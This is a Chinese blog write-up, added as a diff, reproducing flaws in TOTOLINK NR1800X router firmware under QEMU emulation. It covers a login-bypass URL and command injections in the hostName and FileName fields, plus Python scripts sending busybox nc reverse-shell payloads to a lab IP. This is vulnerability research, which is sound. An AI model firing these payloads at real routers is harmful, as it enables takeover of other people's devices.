@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="Misaki" />
+  
+  <meta name="description" content="记录 TOTOLINK NR1800X 固件解包、MIPS QEMU 系统级模拟、后台登录绕过、OpModeCfg 和 UploadFirmwareFile 命令注入复现。" />
+  
+  <link rel="canonical" href="https://misaki.wiki/posts/totolink-nr1800x-firmware-auth-bypass-command-injection/">
+  <meta property="og:site_name" content="Misaki" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="TOTOLINK NR1800X 固件模拟、登录绕过与命令注入复现 | Misaki" />
+  
+  <meta property="og:description" content="记录 TOTOLINK NR1800X 固件解包、MIPS QEMU 系统级模拟、后台登录绕过、OpModeCfg 和 UploadFirmwareFile 命令注入复现。" />
+  
+  <meta property="og:url" content="https://misaki.wiki/posts/totolink-nr1800x-firmware-auth-bypass-command-injection/" />
+  
+  <meta property="og:image" content="https://misaki.wiki/img/misaki.jpg" />
+  
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="TOTOLINK NR1800X 固件模拟、登录绕过与命令注入复现 | Misaki" />
+  
+  <meta name="twitter:description" content="记录 TOTOLINK NR1800X 固件解包、MIPS QEMU 系统级模拟、后台登录绕过、OpModeCfg 和 UploadFirmwareFile 命令注入复现。" />
+  
+  
+  <meta name="twitter:image" content="https://misaki.wiki/img/misaki.jpg" />
+  
+  
+  <title>
+    TOTOLINK NR1800X 固件模拟、登录绕过与命令注入复现 | Misaki
+  </title>
+  
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TOTOLINK NR1800X 固件模拟、登录绕过与命令注入复现","description":"记录 TOTOLINK NR1800X 固件解包、MIPS QEMU 系统级模拟、后台登录绕过、OpModeCfg 和 UploadFirmwareFile 命令注入复现。","url":"https://misaki.wiki/posts/totolink-nr1800x-firmware-auth-bypass-command-injection/","mainEntityOfPage":{"@type":"WebPage","@id":"https://misaki.wiki/posts/totolink-nr1800x-firmware-auth-bypass-command-injection/"},"datePublished":"2025-12-07T10:07:00.000Z","dateModified":"2026-06-16T08:11:14.312Z","author":{"@type":"Person","name":"Misaki"},"publisher":{"@type":"Organization","name":"Misaki"},"image":["https://misaki.wiki/img/misaki.jpg"],"articleSection":"CVE","keywords":"CVE, IoT, firmware, QEMU, pwn, command-injection, TOTOLINK"}</script>
+  
+
+  
+    <link rel="apple-touch-icon" href="/img/favicon.ico">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Misaki" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/misaki.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Misaki</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">文章</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <h1 class="post-title">TOTOLINK NR1800X 固件模拟、登录绕过与命令注入复现</h1>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-06-16 16:11:14
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CVE/" title="CVE">
+                    <b>#</b> CVE
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CVE/" title="CVE">
+                    #CVE
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IoT/" title="IoT">
+                    #IoT
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/firmware/" title="firmware">
+                    #firmware
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/QEMU/" title="QEMU">
+                    #QEMU
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/pwn/" title="pwn">
+                    #pwn
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/command-injection/" title="command-injection">
+                    #command-injection
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/TOTOLINK/" title="TOTOLINK">
+                    #TOTOLINK
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>[[CVE]]<br>[固件下载]<a target="_blank" rel="noopener" href="https://www.totolink.net/data/upload/20220412/f08f694a4322b1e8463abb3d41d21688.rar">https://www.totolink.net/data/upload/20220412/f08f694a4322b1e8463abb3d41d21688.rar</a>)<br>Ubuntu22<br>IDA9.1<br>binwalk<br>qemu<br>[[firmwalker]]</p>
+<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>binwalk 解包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me TOTOLINK_C834FR-1C_NR1800X_IP04469_MT7621A_SPI_16M256M_V9.1.0u.6279_B20210910_ALL.web</span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125152943421.png" alt="image.png"></p>
+<p>firmwalker 分析<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125152908387.png" alt="image.png"></p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125152906205.png" alt="image.png"></p>
+<p>readelf  分析busybox</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -h ./bin/busybox</span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125153043034.png" alt="image.png"><br>mips架构，小端序</p>
+<p>先在宿主机配置网卡，用于后面和qemu模拟出来的虚拟机进行通信</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> brctl addbr virbr0</span><br><span class="line"><span class="built_in">sudo</span> ifconfig virbr0 192.168.2.1/24 up</span><br><span class="line"><span class="built_in">sudo</span> tunctl -t tap0</span><br><span class="line"><span class="built_in">sudo</span> ifconfig tap0 192.168.2.11/24 up</span><br><span class="line"><span class="built_in">sudo</span> brctl addif virbr0 tap0</span><br></pre></td></tr></table></figure>
+<p>在模拟前需要先<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/">下载</a>以下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-3.2.0-4-4kc-malta 内核镜像文件 </span><br><span class="line">debian_squeeze_mipsel_standard.qcow2 虚拟磁盘映像文件</span><br></pre></td></tr></table></figure>
+<p>系统级模拟</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> qemu-system-mipsel -M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -nographic \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>
+<p>在qemu模拟的虚拟机中配置网络，使其宿主机和虚拟机进行通信</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.2.12 up</span><br></pre></td></tr></table></figure>
+
+<p>将squashfs-root压缩后传入虚拟机中并解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf squashfs-root.gz squashfs-root</span><br><span class="line">scp squashfs-root.gz root@192.168.2.12:/</span><br><span class="line">tar -zxvf squashfs-root.gz</span><br></pre></td></tr></table></figure>
+<p>进入shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> ./squashfs-root sh</span><br></pre></td></tr></table></figure>
+
+<p>web服务为：&#x2F;usr&#x2F;sbin&#x2F;lighttpd，我们先直接启动进行尝试</p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125162256322.png" alt="image.png"><br>需要config，使用grep搜索相关文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ir <span class="string">&quot;lighttpd&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125165709119.png" alt="image.png"><br>有直接对应的lighttpd.conf配置文件，直接加载即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125170549518.png" alt="image.png"><br>报错 &#x2F;var&#x2F;run&#x2F;lighttpd.pid没有这样的文件或目录<br>手动进行创建</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./var </span><br><span class="line"><span class="built_in">mkdir</span> run </span><br><span class="line"><span class="built_in">cd</span> run </span><br><span class="line"><span class="built_in">touch</span> lighttpd.pid</span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130194931526.png" alt="image.png"><br>成功启动</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h3><p>拦截请求包分析内容<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130195120874.png" alt="image.png"><br>关键字 <strong>formLoginAuth.htm?authCode</strong> 使用grep进行搜索</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ir <span class="string">&quot;formLoginAuth.htm?authCode&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130195324633.png" alt="image.png"><br>对 <strong>cstecgi.cgi</strong> 进行分析<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130195601583.png" alt="image.png"><br>搜索字符串<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130201748801.png" alt="image.png"><br>获取用户名、密码、flag，根据请求包分析用户名固定为admin，密码为输入<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130201724078.png" alt="image.png"></p>
+<p>获取路由器后台的账号密码<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130201813877.png" alt="image.png"><br>127行 判断flag是否为1，则将后台的name赋值给传入的name，根据请求包猜测为用户名是否有进行设置，否则直接使用admin传入<br>129行 进行用户名和密码的判断<br>130行 如果-<code>ren_qing_style</code>为1且密码为空则也可以登录<br>132-150行 认证成功后判断当前设备类型<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130202443709.png" alt="image.png"><br>认证失败则v18赋值为0<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130202535086.png" alt="image.png"><br>构造响应内容，也就是前面bp接受的内容</p>
+<p>我们接着继续分析<strong>lighttpd</strong>中的<strong>Form_Login</strong><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130204624146.png" alt="image.png"><br>依次来获取对应值</p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130205251208.png" alt="image.png"><br><strong>home.html_3</strong>为goURL<br><strong>home.html_2</strong>为flag<br>如果goURL为空的话，根据flag的值进行跳转页面<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130205415481.png" alt="image.png"><br>判断v8，实际上就是判断authCode，认证是否通过<br>总结:是否有<code>authCode</code>值，来决定是否进入<code>home.html</code>主界面，否则就返回到<code>login.html</code>界面，所以我们构造访问url就可以直接绕过登录了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">2.12</span>/formLoginAuth.htm?authCode=<span class="number">1</span>&amp;userName=admin&amp;goURL=home.html&amp;action=login</span><br></pre></td></tr></table></figure>
+<p>将authCod设为1，且goURL为home.html进行跳转</p>
+<h3 id="OpModeCfg命令注入"><a href="#OpModeCfg命令注入" class="headerlink" title="OpModeCfg命令注入"></a>OpModeCfg命令注入</h3><p>漏洞点在 <strong>cstecgi.cgi</strong> 中的 <strong>hostName</strong> 传入后过滤不严谨，使其执行dosystem<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201144811466.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201145022311.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201145032764.png" alt="image.png"><br>且需要执行到这边，需要n6不能等于0、3、4、6<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201145135534.png" alt="image.png"><br>且n6是获取的proto，输入5即可</p>
+<p>漏洞点在<strong>sub_421C98</strong>函数中我们按x交叉引用找到上一个函数<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183639992.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183649916.png" alt="image.png"><br>调用链也就是 sub_42B9F8-&gt;sub_422F3C-&gt;sub_421C98<br>那么是如何调用到sub_42B9F8<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183804069.png" alt="image.png"></p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183850333.png" alt="image.png"><br>首先在main函数中有获取 <strong>topicurl</strong> 根据内容进行匹配对应函数<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183943805.png" alt="image.png"><br>其中在while循环中会在get_handle_t搜索是否有对应的地址进行跳转<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201195126649.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201195132955.png" alt="image.png"><br>当 <strong>topicurl</strong> 为 <strong>setOpModeCfg</strong> 时会跳转到 <strong>sub_42B9F8</strong> 也就是我们需要利用得函数位置，此时我们bp拦截请求包，再修改内容<br>topicurl&#x3D;setOpModeCfg<br>proto&#x3D;5<br>hostname&#x3D;’;ls ..&#x2F;..&#x2F;;’<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201195527097.png" alt="image.png"><br>成功</p>
+<h4 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h4><p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201201845665.png" alt="image.png"><br>设置监听<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201202208721.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201202245971.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201202357619.png" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.12:80/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;SESSION_ID=2:1764591470:2&quot;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;topicurl&quot;</span> : <span class="string">&quot;setOpModeCfg&quot;</span>,</span><br><span class="line"><span class="string">&quot;proto&quot;</span> : <span class="string">&quot;8&quot;</span>,</span><br><span class="line"><span class="string">&quot;switchOpMode&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="string">&quot;hostName&quot;</span> : <span class="string">&quot;&#x27;;/bin/busybox nc 192.168.2.11 4444 -e /bin/sh;&#x27;&quot;</span>&#125;</span><br><span class="line">response = requests.post(url, cookies=cookie, json=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>
+
+<h3 id="UploadFirmwareFile命令注入"><a href="#UploadFirmwareFile命令注入" class="headerlink" title="UploadFirmwareFile命令注入"></a>UploadFirmwareFile命令注入</h3><p>和上面一样通过<strong>topicurl</strong> 为 <strong>UploadFirmwareFile</strong> 时会跳转到 <strong>sub_42D3B4</strong><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/02d99a3a-7c68-4eb9-8e33-daed02510a52.png" alt="02d99a3a-7c68-4eb9-8e33-daed02510a52.png"><br>且在接收 <strong>FullName</strong> 时无过滤，执行 <strong>dosystem</strong></p>
+<h4 id="rce-1"><a href="#rce-1" class="headerlink" title="rce"></a>rce</h4><p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201204507757.png" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.12:80/cgi-bin/cstecgi.cgi&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;SESSION_ID=2:1764591470:2&quot;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;topicurl&#x27;</span> : <span class="string">&quot;UploadFirmwareFile&quot;</span>,</span><br><span class="line"><span class="string">&quot;FileName&quot;</span> : <span class="string">&quot;$(/bin/busybox nc 192.168.2.11 4444 -e /bin/sh)&quot;</span>&#125;</span><br><span class="line">response = requests.post(url, cookies=cookie, json=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>
+
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/cve-2024-39226-glinet-gl-ax1800-command-injection-rce/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-06-16 16:11:14
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CVE/" title="CVE">
+                        <b>#</b> CVE
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CVE/" title="CVE">
+                        #CVE
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IoT/" title="IoT">
+                        #IoT
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/firmware/" title="firmware">
+                        #firmware
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/QEMU/" title="QEMU">
+                        #QEMU
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/pwn/" title="pwn">
+                        #pwn
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/command-injection/" title="command-injection">
+                        #command-injection
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/TOTOLINK/" title="TOTOLINK">
+                        #TOTOLINK
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/cve-2025-0282-ivanti-connect-secure-rce-debugging/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-text">登录绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpModeCfg%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">OpModeCfg命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rce"><span class="toc-text">rce</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UploadFirmwareFile%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">UploadFirmwareFile命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rce-1"><span class="toc-text">rce</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/xxianxiayubanmian">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+            <a title="email" href="mailto:misakimei1311@qq.com">
+              <i class="iconfont icon-envelope"></i>
+            </a>
+            
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2026 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
